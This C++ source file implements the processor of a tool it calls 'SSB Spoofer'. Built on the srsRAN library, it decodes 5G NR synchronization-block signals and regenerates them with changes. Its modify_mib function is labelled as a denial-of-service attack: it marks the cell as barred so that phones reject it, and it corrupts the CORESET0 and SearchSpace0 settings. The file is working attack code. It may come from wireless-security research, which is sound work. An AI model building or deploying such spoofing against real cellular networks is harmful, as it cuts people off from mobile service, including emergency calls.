/**
 * SSB Spoofer SSB Processor Implementation
 */

#include "ssb_processor.h"
#include <iostream>
#include <cstring>
#include <iomanip>
#include <algorithm>
#include <complex>

namespace ssb_spoofer {

SsbProcessor::SsbProcessor() : initialized_(false), srate_hz_(0.0), center_freq_hz_(0.0) {
  std::memset(&ssb_, 0, sizeof(srsran_ssb_t));
}

SsbProcessor::~SsbProcessor() {
  if (initialized_) {
      srsran_ssb_free(&ssb_);
  }
}

bool SsbProcessor::init(const SsbConfig& config, double srate_hz, double center_freq_hz) {
  if (initialized_) {
      std::cerr << "SSB Processor already initialized" << std::endl;
      return false;
  }
  
  config_           = config;
  srate_hz_         = srate_hz;
  center_freq_hz_   = center_freq_hz;
  
  // Initialize SSB arguments
  srsran_ssb_args_t args    = {};
  args.max_srate_hz         = srate_hz;
  args.min_scs              = srsran_subcarrier_spacing_15kHz;
  args.enable_search        = true;
  args.enable_measure       = true;
  args.enable_encode        = true;
  args.enable_decode        = true;
  args.disable_polar_simd   = false;
  args.pbch_dmrs_thr        = 0.0f; // Use default
  
  std::cout << "Initializing SSB processor..." << std::endl;
  if (srsran_ssb_init(&ssb_, &args) != SRSRAN_SUCCESS) {
      std::cerr << "Error initializing SSB" << std::endl;
      return false;
  }
  
  initialized_ = true;
  
  // Configure SSB
  return configure(config, srate_hz, center_freq_hz);
}

bool SsbProcessor::configure(const SsbConfig& config, double srate_hz, double center_freq_hz) {
  if (!initialized_) {
      std::cerr << "SSB Processor not initialized" << std::endl;
      return false;
  }
  
  config_           = config;
  srate_hz_         = srate_hz;
  center_freq_hz_   = center_freq_hz;
  
  // Calculate actual SSB frequency (center frequency + offset)
  double ssb_freq_hz = center_freq_hz + config.ssb_freq_offset_hz;
  
  // Setup SSB configuration
  srsran_ssb_cfg_t ssb_cfg  = {};
  ssb_cfg.srate_hz          = srate_hz;
  ssb_cfg.center_freq_hz    = center_freq_hz;  // Use actual RF center frequency
  ssb_cfg.ssb_freq_hz       = ssb_freq_hz;        // Use actual SSB frequency
  ssb_cfg.scs               = scs_from_khz(config.scs_khz);
  ssb_cfg.pattern           = pattern_from_string(config.pattern);
  ssb_cfg.duplex_mode       = SRSRAN_DUPLEX_MODE_FDD;
  ssb_cfg.periodicity_ms    = config.periodicity_ms;
  ssb_cfg.beta_pss          = config.beta_pss;
  ssb_cfg.beta_sss          = config.beta_sss;
  ssb_cfg.beta_pbch         = config.beta_pbch;
  ssb_cfg.beta_pbch_dmrs    = config.beta_pbch_dmrs;
  ssb_cfg.scaling           = 0.0f; // Use default
  
  std::cout << "Configuring SSB processor..." << std::endl;
  std::cout << "  Sample rate: " << srate_hz / 1e6 << " MHz" << std::endl;
  std::cout << "  Center frequency: " << center_freq_hz / 1e6 << " MHz" << std::endl;
  std::cout << "  SSB frequency: " << ssb_freq_hz / 1e6 << " MHz" << std::endl;
  std::cout << "  SSB pattern: " << config.pattern << std::endl;
  std::cout << "  Subcarrier spacing: " << config.scs_khz << " kHz" << std::endl;
  
  if (srsran_ssb_set_cfg(&ssb_, &ssb_cfg) != SRSRAN_SUCCESS) {
      std::cerr << "Error configuring SSB" << std::endl;
      return false;
  }
  
  std::cout << "SSB processor configured successfully" << std::endl;
  return true;
}

SsbSearchResult SsbProcessor::scan(const std::complex<float>* buffer, uint32_t nsamples,
                             std::optional<uint32_t> target_pci) {
  SsbSearchResult result = {};
  result.found = false;
  
  if (!initialized_) {
      std::cerr << "SSB Processor not initialized" << std::endl;
      return result;
  }
  
  // Perform SSB search
  srsran_ssb_search_res_t search_res = {};
  
  // Cast std::complex<float>* to cf_t* (compatible types)
  const cf_t* cf_buffer = reinterpret_cast<const cf_t*>(buffer);
  
  if (srsran_ssb_search(&ssb_, cf_buffer, nsamples, &search_res) != SRSRAN_SUCCESS) {
      return result;
  }
  
  // Check if PBCH was successfully decoded
  if (!search_res.pbch_msg.crc) {
      return result;
  }
  
  // If target PCI specified, check if it matches
  if (target_pci.has_value() && search_res.N_id != target_pci.value()) {
      return result;
  }
  
  result.found      = true;
  result.pci        = search_res.N_id;
  result.pbch_msg   = search_res.pbch_msg;
  result.ssb_idx    = search_res.pbch_msg.ssb_idx;
  result.snr_db     = search_res.measurements.snr_dB;  // Note: capital B
  result.rsrp_dbm   = search_res.measurements.rsrp_dB;
  
  // Decode MIB
  decode_mib(result.pbch_msg, result.mib);
  
  return result;
}

bool SsbProcessor::decode_mib(const srsran_pbch_msg_nr_t& pbch_msg, srsran_mib_nr_t& mib) {
  if (srsran_pbch_msg_nr_mib_unpack(&pbch_msg, &mib) != SRSRAN_SUCCESS) {
      std::cerr << "Error decoding MIB" << std::endl;
      return false;
  }
  
  return true;
}

bool SsbProcessor::modify_mib(srsran_mib_nr_t& mib, const AttackConfig& attack_config) {
  bool modified = false;
  
  std::cout << "\n=== Modifying MIB for SSB Spoofing Attack ===" << std::endl;
  
  // PRIMARY ATTACK: Mark cell as barred - most effective DoS
  if (attack_config.modify_cell_barred) {
      std::cout << "  [ATTACK] Cell Barred: " << (mib.cell_barred ? "true" : "false") 
                << " -> true (UE will reject this cell)" << std::endl;
      mib.cell_barred = true;
      modified = true;
  }
  
  // SECONDARY ATTACK: Corrupt CORESET0 configuration
  if (attack_config.modify_coreset0_idx) {
      uint8_t original = mib.coreset0_idx;
      mib.coreset0_idx = attack_config.coreset0_idx_value;
      std::cout << "  [ATTACK] CORESET0 Index: " << (int)original << " -> " 
                << (int)mib.coreset0_idx << " (invalid PDCCH config)" << std::endl;
      modified = true;
  }
  
  // TERTIARY ATTACK: Corrupt SearchSpace0 configuration  
  if (attack_config.modify_ss0_idx) {
      uint8_t original = mib.ss0_idx;
      mib.ss0_idx = attack_config.ss0_idx_value;
      std::cout << "  [ATTACK] SearchSpace0 Index: " << (int)original << " -> " 
                << (int)mib.ss0_idx << " (invalid SIB1 search space)" << std::endl;
      modified = true;
  }
  
  // Keep original timing parameters for better UE reception
  std::cout << "  [INFO] Keeping SFN: " << mib.sfn << " (for timing consistency)" << std::endl;
  std::cout << "  [INFO] Keeping SSB Offset: " << mib.ssb_offset << std::endl;
  std::cout << "  [INFO] Keeping DMRS position: " << (int)mib.dmrs_typeA_pos << std::endl;
  
  if (modified) {
      std::cout << "=== SSB Spoofing Attack Configured ===" << std::endl;
  } else {
      std::cout << "WARNING: No attack modifications enabled!" << std::endl;
  }
  
  return modified;
}

bool SsbProcessor::encode_mib(const srsran_mib_nr_t& mib, uint32_t ssb_idx, bool hrf,
                        srsran_pbch_msg_nr_t& pbch_msg) {
  // Pack MIB into PBCH message
  int result = srsran_pbch_msg_nr_mib_pack(&mib, &pbch_msg);
  if (result != SRSRAN_SUCCESS) {
      std::cerr << "[ERROR] Failed to encode MIB" << std::endl;
      return false;
  }
  
  // Set additional fields
  pbch_msg.ssb_idx = ssb_idx;
  pbch_msg.hrf = hrf;
  
  return true;
}

uint32_t SsbProcessor::generate_ssb(uint32_t pci, const srsran_pbch_msg_nr_t& pbch_msg,
                              std::complex<float>* output, uint32_t ssb_idx) {
  if (!initialized_) {
      std::cerr << "SSB Processor not initialized" << std::endl;
      return 0;
  }
  
  uint32_t sf_size = get_subframe_size();
  
  if (sf_size == 0) {
      std::cerr << "[ERROR] Invalid subframe size" << std::endl;
      return 0;
  }
  
  // Clear output buffer
  std::fill(output, output + sf_size, std::complex<float>(0.0f, 0.0f));
  
  // Create zero-filled input buffer
  std::vector<std::complex<float>> input_buffer(sf_size, std::complex<float>(0.0f, 0.0f));
  
  // Add SSB to the buffer
  cf_t* cf_input = reinterpret_cast<cf_t*>(input_buffer.data());
  cf_t* cf_output = reinterpret_cast<cf_t*>(output);
  
  int result = srsran_ssb_add(&ssb_, pci, &pbch_msg, cf_input, cf_output);
  if (result != SRSRAN_SUCCESS) {
      std::cerr << "[ERROR] Failed to generate SSB signal" << std::endl;
      return 0;
  }
  
  return sf_size;
}

uint32_t SsbProcessor::get_ssb_size() const {
  if (!initialized_) {
      return 0;
  }
  return ssb_.ssb_sz;
}

uint32_t SsbProcessor::get_subframe_size() const {
  if (!initialized_) {
      return 0;
  }
  return ssb_.sf_sz;
}

void SsbProcessor::print_mib(const srsran_mib_nr_t& mib) {
  std::cout << "\n=== MIB Information ===" << std::endl;
  std::cout << "  SFN: " << mib.sfn << std::endl;
  std::cout << "  SSB Index: " << static_cast<uint32_t>(mib.ssb_idx) << std::endl;
  std::cout << "  Half Radio Frame: " << (mib.hrf ? "Yes" : "No") << std::endl;
  std::cout << "  Subcarrier Spacing Common: ";
  switch (mib.scs_common) {
      case srsran_subcarrier_spacing_15kHz: std::cout << "15 kHz"; break;
      case srsran_subcarrier_spacing_30kHz: std::cout << "30 kHz"; break;
      case srsran_subcarrier_spacing_60kHz: std::cout << "60 kHz"; break;
      case srsran_subcarrier_spacing_120kHz: std::cout << "120 kHz"; break;
      case srsran_subcarrier_spacing_240kHz: std::cout << "240 kHz"; break;
      default: std::cout << "Unknown"; break;
  }
  std::cout << std::endl;
  std::cout << "  SSB Offset: " << mib.ssb_offset << std::endl;
  std::cout << "  DMRS TypeA Position: " << static_cast<uint32_t>(mib.dmrs_typeA_pos) << std::endl;
  std::cout << "  CORESET0 Index: " << mib.coreset0_idx << std::endl;
  std::cout << "  SearchSpace Zero Index: " << mib.ss0_idx << std::endl;
  std::cout << "  Cell Barred: " << (mib.cell_barred ? "Yes" : "No") << std::endl;
  std::cout << "  Intra-Freq Reselection: " << (mib.intra_freq_reselection ? "Allowed" : "Not Allowed") << std::endl;
  std::cout << "=======================" << std::endl << std::endl;
}

srsran_ssb_pattern_t SsbProcessor::pattern_from_string(const std::string& pattern) {
  if (pattern == "A") return SRSRAN_SSB_PATTERN_A;
  if (pattern == "B") return SRSRAN_SSB_PATTERN_B;
  if (pattern == "C") return SRSRAN_SSB_PATTERN_C;
  if (pattern == "D") return SRSRAN_SSB_PATTERN_D;
  if (pattern == "E") return SRSRAN_SSB_PATTERN_E;
  
  std::cerr << "Warning: Unknown SSB pattern '" << pattern << "', defaulting to C" << std::endl;
  return SRSRAN_SSB_PATTERN_C;
}

srsran_subcarrier_spacing_t SsbProcessor::scs_from_khz(uint32_t scs_khz) {
  switch (scs_khz) {
      case 15: return srsran_subcarrier_spacing_15kHz;
      case 30: return srsran_subcarrier_spacing_30kHz;
      case 60: return srsran_subcarrier_spacing_60kHz;
      case 120: return srsran_subcarrier_spacing_120kHz;
      case 240: return srsran_subcarrier_spacing_240kHz;
      default:
      std::cerr << "Warning: Unknown SCS " << scs_khz << " kHz, defaulting to 30 kHz" << std::endl;
      return srsran_subcarrier_spacing_30kHz;
  }
}

} // namespace ssb_spoofer
